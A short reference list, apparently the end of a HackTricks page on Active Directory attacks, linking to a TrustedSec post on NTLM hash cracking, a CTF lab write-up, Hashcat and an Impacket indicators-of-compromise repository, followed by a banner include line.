- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)

{{#include ../../banners/hacktricks-training.md}}
